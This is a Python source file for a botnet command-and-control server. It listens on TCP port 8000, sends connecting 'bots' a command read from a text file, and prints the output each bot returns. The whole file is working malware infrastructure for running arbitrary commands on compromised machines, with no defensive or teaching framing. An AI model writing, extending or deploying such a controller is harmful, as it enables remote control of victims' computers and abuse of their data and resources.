import socketserver
import struct

def recvcall(sock, n):
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def send_msg(sock, payload: bytes):
    sock.sendall(struct.pack('!I', len(payload)) + payload)

def recv_msg(sock):
    hdr = recvcall(sock, 4)
    if not hdr:
        return None
    length = struct.unpack('!I', hdr)[0]
    if length == 0:
        return b''
    return recvcall(sock, length)

# Read command from file
with open("commands.txt", "r") as f:
    command_to_send = f.read().strip()

class BotHandler(socketserver.BaseRequestHandler):
    def handle(self):
        bot_ip = self.client_address[0]
        print(f"[+] Bot connected from: {bot_ip}")
        
        hello = recv_msg(self.request)

        if hello:
            print(f"[{bot_ip}] hello :: {hello.decode(errors='replace')}")

        # Send command
        send_msg(self.request, command_to_send.encode())

        resp = recv_msg(self.request)
        
        if resp is None:
            print(f"[{bot_ip}][!] disconnected before sending output.")
            return
        print(f"\n[{bot_ip}][+] Output for '{command_to_send}' ::\n{resp.decode(errors='replace')}\n")

        # Optional clean exit
        send_msg(self.request, b"exit")

if __name__ == "__main__":
    HOST, PORT = "", 8000
    with socketserver.ThreadingTCPServer((HOST, PORT), BotHandler) as server:
        print(f"[+] CNC server is running on port {PORT} ... ")
        server.serve_forever()